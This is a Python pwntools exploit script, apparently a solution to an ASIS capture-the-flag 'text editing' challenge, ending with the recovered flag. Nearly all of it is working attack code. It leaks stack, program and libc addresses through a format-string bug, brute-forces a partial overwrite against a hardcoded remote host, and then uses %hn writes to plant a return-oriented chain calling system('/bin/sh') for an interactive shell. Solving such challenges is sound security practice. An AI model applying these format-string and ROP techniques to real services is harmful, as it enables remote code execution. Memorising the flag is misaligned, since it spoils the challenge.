from pwn import *
context.binary = "./chall"
#p = process()
script = """
b*show_error+8
c
"""
#gdb.attach(p,script)
#p = remote("45.153.243.57",13337)
def bruteforce(payload: bytes):
    status = ""
    msg = ""
    #gdb.attach(p,script)
    #a = p.recv()
    p.sendline(b'1')
    time.sleep(0.2)
    b =p.recv()
    p.send(payload)
    time.sleep(0.2)
    c = p.recv()
    #print(c)
    (p.recv())
    p.sendline(b'4')
    time.sleep(0.2)
    try:
        msg = p.recv()
        print(msg)
        if b'AAAA' in msg: status = "success"
    except Exception:
        status = 'fail'
    return status




while True:
    #p = process()
    p = remote("45.153.243.57", 13337)
    a = p.recv()
    (p.recv())
    payload = b'%6$p.%7$p.%45$p'.ljust(16,b'|')
    payload += b'A'*(256-len(payload))
    payload += b'\x20\x90'
    print(payload)
    status = bruteforce(payload)
    if status == 'success': break
    else: p.close()
(p.recv())
p.sendline(b'4')
leak = []
leak = p.recvuntil(b'|').strip(b'|').decode().split('.')
print(leak)
stack_leak = int(leak[0],base=16)
main_leak = int(leak[1],base=16)
libc_leak = int(leak[2],base=16)
log.info("Leak stack: %s", hex(stack_leak))
log.info("Main leak: %s", hex(main_leak))
log.info("Libc leak: %s", hex(libc_leak))


#################################################
#gdb.attach(p,script)
rbp_stack = stack_leak - 0x130
rip_stack = stack_leak - 0x128

sys_func = libc_leak + 0x26fd0
bin_sh = libc_leak + 0x1ae908
pop_rdi = (libc_leak -0x1d90) + 0x23e5 
ret = pop_rdi + 1

destination = stack_leak-0xb0
destination = hex(destination)[-4:]
log.info("Destination: %s", destination)
destination = int(destination,base=16) -16
p.sendline(b'1')
p.recv()
payload2 = str('%16c%14$hhn%{}c%15$hn'.format(destination).ljust(32,'.')).encode() + p64(rip_stack) + p64(rbp_stack)
payload2 += cyclic(56) + p64(ret) + p64(pop_rdi) + p64(bin_sh) + p64(sys_func)
p.send(payload2)
time.sleep(0.2)
p.recv()
p.sendline(b'2')
time.sleep(0.2)
p.recv()
p.sendline(b'4')
p.interactive()
#input: 10
#Flag: ASIS{text_editing_has_never_been_so_fun_d1fd2}
